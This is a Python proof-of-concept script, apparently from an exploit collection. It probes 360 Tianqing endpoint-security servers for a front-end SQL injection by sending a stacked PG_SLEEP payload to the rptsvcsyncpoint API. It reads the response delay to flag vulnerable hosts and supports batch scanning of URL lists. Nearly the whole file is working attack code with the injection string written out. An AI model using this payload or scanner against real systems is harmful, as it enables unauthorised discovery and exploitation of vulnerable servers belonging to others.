'''
Author: your name
Date: 2021-04-08 14:08:20
LastEditTime: 2021-04-08 14:35:09
LastEditors: Please set LastEditors
Description: In User Settings Edit
FilePath: \360天擎-前台sql注入\poc.py
'''
import binascii
import requests
import subprocess
import time
import json
import os
import sys

from requests.sessions import session
os.system('')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse

class poc():
    def title(self):
        print('''
+-----------------------------------------------------------------+
漏洞名称:天擎 前台sql注入  
功能：单个检测，批量检测                                     
单个检测：python poc.py -u url
批量检测：python poc.py -f 1.txt
+-----------------------------------------------------------------+                                     
''')
    #漏洞检测
    def poc(self, target_url, session):
        url = f"{target_url}/api/dp/rptsvcsyncpoint?ccid=1';"
        payload=url+"SELECT PG_SLEEP(1)--"
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        try:
            res = session.get(url=payload,
                                headers=headers,
                                verify=False,
                                timeout=10)
            return res
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
    def main(self, target_url, file):
        self.title()
        count=0
        if target_url:
            session = requests.session()
            res=self.poc(target_url, session)
            if res.elapsed.total_seconds()>6 and res.status_code==200:
                print(f'\033[31m[+] 延时 {res.elapsed.total_seconds()} 响应值为 {res.status_code}，{target_url} 可能存在漏洞\033[0m')
            else:
                print(f'[+] 延时 {res.elapsed.total_seconds()} 响应值为 {res.status_code}，{target_url} 不存在漏洞')
        if file:
            for url in file:
                count += 1
                target_url = url.replace('\n', '')  #取消换行符
                session = requests.session()
                res=self.poc(target_url, session)
                try:
                    if res.elapsed.total_seconds()>6 and res.status_code==200:
                        print(f'\033[31m[{count}] 延时 {res.elapsed.total_seconds()} 响应值为 {res.status_code}，{target_url} 可能存在漏洞\033[0m')
                    else:
                        print(f'[{count}] 延时 {res.elapsed.total_seconds()} 响应值为 {res.status_code}，{target_url} 不存在漏洞')
                except Exception as e:
                    print("\033[31m[x] 请求失败 \033[0m", e)
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=False,
                        help="目标地址，带上http://")
    parser.add_argument("-f",
                        '--file',
                        type=argparse.FileType('r'),
                        default=False,
                        help="批量检测，带上http://")
    args = parser.parse_args()
    run = poc()
    run.main(args.url, args.file)
